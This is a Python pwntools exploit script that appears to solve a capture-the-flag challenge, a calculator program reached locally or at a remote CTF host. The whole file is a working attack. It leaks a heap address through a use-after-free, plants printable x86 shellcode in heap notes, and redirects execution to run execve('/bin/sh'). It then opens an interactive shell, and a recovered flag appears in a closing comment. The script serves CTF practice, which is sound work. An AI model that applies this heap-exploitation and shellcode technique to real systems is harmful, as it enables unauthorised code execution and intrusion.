#!/usr/bin/env python2

from pwn import *
import string

###

if len(sys.argv) > 1:
    DEBUG = False
else:
    DEBUG = True

b = ELF('TWWC_04529c52a11d1fae316a2caed8a0a2ba')
context.arch = 'i386'
context.log_level = 'info'

###

if DEBUG:
    r = process('TWWC_04529c52a11d1fae316a2caed8a0a2ba', aslr = False)
else:
    r = remote('pwn.ctf.rocks', 6969)

def menu():
    global r
    r.recvuntil('#> ')

def add(exp):
    global r
    r.sendline('1')
    r.recvuntil('Enter your expression (i.e: 1 + 1): ')
    r.sendline(exp)
    return menu()

def delete(idx):
    global r
    r.sendline('2')
    r.recvuntil('ct an expression to delete (i.e 0): ')
    r.sendline(str(idx))
    return menu()

def calculate(idx, note = '', f = False):
    global r
    r.sendline('3')
    r.recvuntil('n to calculate (i.e 0): ')
    r.sendline(str(idx))
    r.recvuntil('The result is: ')
    d = r.recvline().rstrip()[:-1]
    res = int(d)
    r.recvuntil('result? Y/N: ')
    if len(note) > 0:
        r.sendline('Y')
        r.recvuntil('Enter note size (max 70): ')
        r.sendline(str(len(note)))
        r.recvuntil('Enter note: ')
        if not f:
            r.send(note)
        else: # we inject the address of our note inside the heap (printable payload shellcode)
            for x in p32(res + 0x68):
                if not DEBUG and x not in string.printable:
                    log.info('not printable char detected, exiting...')
                    sys.exit(1)
            r.send('A' * 12 + p32(res + 0x68))
    else:
        r.sendline('N')
    menu()
    return d

menu()

GDB = False
if GDB and DEBUG:
    base = 0x56555000
    bp = [ base + 0xec7, base + 0xF2E ]
    bps = ''
    for x in bp:
        bps += 'b *%#x\n' % x
    gdb.attach(r, bps)

# first we want to leak heap ptr
add('1 + 1')
add('1 + 0')
add('1 + 1')
delete(0)
delete(1)
baseheap = int(calculate(1, 'A' * 0x10, True)) # we begin to exploit the UAF right now
log.info('baseheap: %#x' % baseheap)

# putting alpha num shellcode now
# we are executing first alpha shellcode then jumping on shellcode limited to 8 bytes
SC = asm('''
    push 0xb
    pop eax
    int 0x80
    nop
    nop
    nop
''')

add('%d + %d' % (u32(SC[0:4], signed=True), u32(SC[4:8], signed=True)))
add('0 + 0')
# payload needs to be a printable shellcode
# we setup a standard execve('/bin/sh', 0, 0) then jump to second shellcode (SC)
payload  = asm('''
    push ecx
    pop eax
    xor eax, 0x41414141
    push eax
    push eax
    pop ecx
    pop edx
    push eax
    xor eax, 0x68732f2f
    push eax
    xor eax, 0x68732f2f
    xor eax, 0x6e69622f
    push eax
    push esp
    pop ebx
    jne short $+41
''')
# useless now, but lazy to remove cause it'll shift offsets
payload += '/bin/sh'
for x in payload:
    if x not in string.printable and not DEBUG:
        log.info('Detected not printable char in payload')
        print hexdump(payload)
        sys.exit(1)
log.info('payload len: %d' % len(payload))
calculate(4, payload)
# we spam a bit the heap even though it's useless, but easier to find a printable offset for the jne offset when debugging :)
add('%d + %d' % (u32(SC[0:4], signed=True), u32(SC[4:8], signed=True)))
add('%d + %d' % (u32(SC[0:4], signed=True), u32(SC[4:8], signed=True)))
add('%d + %d' % (u32(SC[0:4], signed=True), u32(SC[4:8], signed=True)))
add('%d + %d' % (u32(SC[0:4], signed=True), u32(SC[4:8], signed=True)))
# triggering sploit now
r.sendline('3') # calculate
r.recvuntil('n to calculate (i.e 0): ')
r.sendline('1')

r.interactive()
r.close()

# SCTF{0ne_PLUS_0ne_3qu4l5_fl4g}
